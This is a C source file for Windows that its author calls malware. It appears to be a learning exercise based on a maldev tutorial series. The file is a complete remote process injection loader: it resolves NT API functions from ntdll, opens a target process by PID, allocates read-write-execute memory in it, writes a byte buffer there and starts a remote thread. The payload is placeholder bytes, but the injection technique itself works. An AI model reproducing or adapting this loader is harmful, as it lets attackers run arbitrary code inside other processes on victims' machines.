// As always, thank you to crow for providing excellent maldev tutorials. https://www.youtube.com/watch?v=P1PHRcmPM7c&list=PL_z_ep2nxC57sHAlCcvvaYRrpdMIQXri1&index=5
#include <windows.h> //Believe it or not, this malware is for Windows. (shocking)
#include <stdio.h>
#include <defenitions.h>

HMODULE GetMod(
  IN LPCWSTR modName
) {
  HMODULE hModule = NULL;

  info("Trying to get a handle to %S", modName);
  hModule = GetModuleHandleW(modName);

  if (hModule == NULL) {
    warn("Failed to get a handle to the module, error 0x%lx\n", GetLastError());
    return NULL;
  }

  else {
    okay("got a handle to the module!");
    info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
    return hModule;
  }

}

int main(int argc, char* argv[]) {
  DWORD   PID     = 0;
  NTSTATUS STATUS = NULL;
  LPVOID  rBuffer = NULL;
  HMODULE hNTDLL  = NULL;
  HANDLE  hThread = NULL;
  HANDLE  hProcess= NULL;

  const UCHAR aids[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
  SIZE_T szAids = sizeof(aids);

  if(argc < 2) {
    warn("usage: %s <PID>", argv[0]);
    return -1;
  }

  PID = atoi(argv[1]);
  hNTDLL = GetMod(L"NTDLL");

  OBJECT_ATTRIBUTES OA = {sizeof(OA), NULL};
  CLIENT_ID CID = {(HANDLE)PID, NULL};

  info("Populating NT Functions...");
  NtOpenProcess spyOpen = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
  NtCreateThreadEx spyThread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
  NtAllocateVirtualMemoryEx spyVirtualAlloc = (NtAllocateVirtualMemoryEx)GetProcAddress(hNTDLL, "NtAllocateVirtualMemoryEx");
  NtWriteVirtualMemory spyVirtualWrite = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
  NtClose spyClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
  okay("Complete, beginning injection.");

  /*-------- BEGIN INJECTION --------*/
  STATUS = spyOpen(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
  if(STATUS != STATUS_SUCCESS) {
    warn("[NtOpenProcess] failed to get a handle on the process, error: 0x%lx", STATUS);
    return EXIT_FAILURE;
  }
  okay("Got a handle on the process! (%ld)", PID);
  info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);

  info("Allocating [RWX] buffer in process memory...");
  rBuffer = spyVirtualAlloc(hProcess, NULL, szAids, (MEM_RESERVE | MEM_COMMIT),
    PAGE_EXECUTE_READWRITE, NULL, NULL);
  if (rBuffer == NULL) {
    warn("[VirtualAllocEx] failed, error: 0x%lx", GetLastError());
    goto CLEANUP;
  }
  okay("Allocated [RWX] buffer in process memory at 0x%p", rBuffer);

  info("Writing to allocated buffer...");
  spyVirtualWrite(hProcess, rBuffer, aids, szAids, 0);

  STATUS = spyThread(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
  if (STATUS != STATUS_SUCCESS) {
    warn("[NtCreateThreadEx] failed to get a handle on the thread, error: 0x%lx", STATUS);
    goto CLEANUP;
  }
  okay("Thread created, started routine, waiting for thread to finish execution. ");

  WaitForSingleObject(hThread, INFINITE);
  okay("Thread finished execution. Beginning cleanup...");

CLEANUP:
  if (hThread) {
    spyClose(hThread);
    info("Closed handle on thread.");
  }

  if(hProcess) {
    spyClose(hProcess);
    info("Closed handle on process");
  }

  okay("Cleanup complete (we pay the janitor in ruples)");
  return EXIT_SUCCESS;
}